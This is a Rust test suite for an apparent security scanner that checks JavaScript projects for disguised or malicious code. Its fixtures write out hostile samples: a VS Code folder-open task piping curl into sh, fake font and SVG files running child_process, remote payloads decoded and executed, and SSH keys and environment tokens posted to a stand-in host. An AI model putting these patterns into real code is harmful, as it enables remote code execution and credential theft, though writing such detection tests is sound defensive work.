use serde_json::Value;
use std::{
    fs,
    path::PathBuf,
    process::Command,
    time::{SystemTime, UNIX_EPOCH},
};

#[test]
fn json_scan_completes_without_findings() {
    let root = temporary_directory("clean");
    fs::write(root.join("main.js"), b"export const answer = 42;\n").unwrap();

    let output = run(&[root.to_str().unwrap(), "--format", "json"]);

    assert_eq!(output.status.code(), Some(0));
    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert_eq!(report["status"], "complete");
    assert_eq!(report["network_access"], "disabled");
    assert_eq!(report["summary"]["files"], 1);
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn policy_finding_returns_one() {
    let root = temporary_directory("finding");
    fs::create_dir(root.join(".vscode")).unwrap();
    fs::write(
        root.join(".vscode/tasks.json"),
        br#"{"tasks":[{"label":"run","command":"curl https://example.invalid/x | sh","runOptions":{"runOn":"folderOpen"}}]}"#,
    )
    .unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    assert_eq!(output.status.code(), Some(1));
    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert_eq!(report["risk"]["severity"], "critical");
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn disguised_javascript_is_reported_and_bad_source_is_incomplete() {
    let root = temporary_directory("javascript");
    fs::write(
        root.join("fake.woff2"),
        b"module.exports = require('child_process');",
    )
    .unwrap();
    fs::write(root.join("broken.ts"), b"const = ;").unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    assert_eq!(output.status.code(), Some(2));
    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert_eq!(report["status"], "incomplete");
    assert_eq!(report["files"][1]["parsed_language"], "javascript");
    assert!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .any(|finding| {
                finding["id"] == "FILE-PARSEABLE-JAVASCRIPT" && finding["file"] == "fake.woff2"
            })
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn build_config_import_elevates_fake_asset_with_process_execution() {
    let root = temporary_directory("reachable-asset");
    fs::write(
        root.join("tailwind.config.js"),
        b"require('./fake.svg'); module.exports = {};",
    )
    .unwrap();
    fs::write(
        root.join("fake.svg"),
        b"const cp = require('child_process'); cp.exec('id');",
    )
    .unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    assert_eq!(output.status.code(), Some(1));
    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    let finding = report["findings"]
        .as_array()
        .unwrap()
        .iter()
        .find(|finding| finding["id"] == "JS-REACHABLE-DISGUISED-SOURCE")
        .unwrap();
    assert_eq!(finding["severity"], "critical");
    assert_eq!(finding["file"], "fake.svg");
    assert!(
        finding["evidence"]
            .to_string()
            .contains("tailwind.config.js")
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn unimported_fake_asset_is_not_elevated() {
    let root = temporary_directory("unreachable-asset");
    fs::write(
        root.join("fake.svg"),
        b"const cp = require('child_process'); cp.exec('id');",
    )
    .unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .all(|finding| { finding["id"] != "JS-REACHABLE-DISGUISED-SOURCE" })
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn uncalled_function_in_imported_asset_is_not_critical() {
    let root = temporary_directory("uncalled-function");
    fs::write(root.join("tailwind.config.js"), b"require('./fake.svg');").unwrap();
    fs::write(
        root.join("fake.svg"),
        b"const cp = require('child_process'); function later() { cp.exec('id'); }",
    )
    .unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    let finding = report["findings"]
        .as_array()
        .unwrap()
        .iter()
        .find(|finding| finding["id"] == "JS-REACHABLE-DISGUISED-SOURCE")
        .unwrap();
    assert_eq!(finding["severity"], "high");
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn cross_file_response_decode_reaches_computed_function() {
    let root = temporary_directory("cross-file-flow");
    fs::write(
        root.join("package.json"),
        br#"{"scripts":{"start":"node startup.js"}}"#,
    )
    .unwrap();
    fs::write(root.join("api.js"), b"import axios from 'axios'; export async function config() { return (await axios.get('https://example.invalid/x')).data; }").unwrap();
    fs::write(
        root.join("utils.js"),
        b"export function unpack(x) { return Buffer.from(x, 'base64').toString(); }",
    )
    .unwrap();
    fs::write(root.join("startup.js"), b"import { config } from './api.js'; import { unpack } from './utils.js'; const data = unpack(await config()); global['Fun' + 'ction'](data)();").unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    assert_eq!(output.status.code(), Some(1));
    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    let finding = report["findings"]
        .as_array()
        .unwrap()
        .iter()
        .find(|finding| finding["id"] == "JS-REMOTE-CODE-EXECUTION")
        .unwrap();
    assert_eq!(finding["severity"], "critical");
    let evidence = finding["evidence"].to_string();
    assert!(evidence.contains("npm start"));
    assert!(evidence.contains("axios.get"));
    assert!(evidence.contains("decode"));
    assert!(evidence.contains("Function"));
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn static_eval_does_not_form_remote_execution_chain() {
    let root = temporary_directory("static-eval");
    fs::write(root.join("main.js"), b"eval('2 + 2'); fetch('/api/data');").unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .all(|finding| { finding["id"] != "JS-REMOTE-CODE-EXECUTION" })
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn environment_secret_reaches_outbound_request() {
    let root = temporary_directory("secret-exfil");
    fs::write(
        root.join("main.js"),
        b"import axios from 'axios'; const secret = process.env.TOKEN; axios.post('https://example.invalid/collect', JSON.stringify({ token: secret }));",
    )
    .unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    assert_eq!(output.status.code(), Some(1));
    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    let finding = report["findings"]
        .as_array()
        .unwrap()
        .iter()
        .find(|finding| finding["id"] == "JS-SECRET-EXFILTRATION")
        .unwrap();
    assert_eq!(finding["severity"], "critical");
    assert!(finding["evidence"].to_string().contains("process.env"));
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn remote_bytes_written_then_spawned_are_correlated() {
    let root = temporary_directory("write-spawn");
    fs::write(
        root.join("main.js"),
        b"const fs = require('fs'); const cp = require('child_process'); async function run() { const bytes = await fetch('https://example.invalid/x'); fs.writeFileSync('/tmp/payload', bytes); fs.chmodSync('/tmp/payload', 0o755); cp.spawn('/tmp/payload'); } run();",
    )
    .unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    assert_eq!(output.status.code(), Some(1));
    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .any(|finding| {
                finding["id"] == "JS-DOWNLOAD-WRITE-EXECUTE" && finding["severity"] == "critical"
            })
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn fetch_response_to_eval_and_secret_file_to_fetch_are_traced() {
    let root = temporary_directory("fetch-and-file");
    fs::write(root.join("main.js"), b"const fs = require('fs'); async function run() { const response = await fetch('https://example.invalid/config'); eval(await response.text()); const key = fs.readFileSync('/home/user/.ssh/id_rsa'); await fetch('https://example.invalid/collect', {method: 'POST', body: key}); } run();").unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    assert_eq!(output.status.code(), Some(1));
    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    let ids: Vec<&str> = report["findings"]
        .as_array()
        .unwrap()
        .iter()
        .filter_map(|finding| finding["id"].as_str())
        .collect();
    assert!(ids.contains(&"JS-REMOTE-CODE-EXECUTION"));
    assert!(ids.contains(&"JS-SECRET-EXFILTRATION"));
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn benign_network_and_environment_use_do_not_form_exfiltration() {
    let root = temporary_directory("benign-network");
    fs::write(root.join("main.js"), b"import axios from 'axios'; const mode = process.env.NODE_ENV; axios.post('/metrics', { count: 1 }); console.log(mode);").unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .all(|finding| finding["id"] != "JS-SECRET-EXFILTRATION")
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn incomplete_and_invalid_invocations_use_distinct_exit_codes() {
    let missing = run(&["definitely-does-not-exist"]);
    let invalid = run(&[".", "--online"]);

    assert_eq!(missing.status.code(), Some(2));
    assert_eq!(invalid.status.code(), Some(3));
}

fn run(arguments: &[&str]) -> std::process::Output {
    Command::new(env!("CARGO_BIN_EXE_preflightx"))
        .args(arguments)
        .output()
        .unwrap()
}

fn temporary_directory(label: &str) -> PathBuf {
    let nonce = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap()
        .as_nanos();
    let path = std::env::temp_dir().join(format!(
        "preflightx-cli-{label}-{}-{nonce}",
        std::process::id()
    ));
    fs::create_dir(&path).unwrap();
    path
}
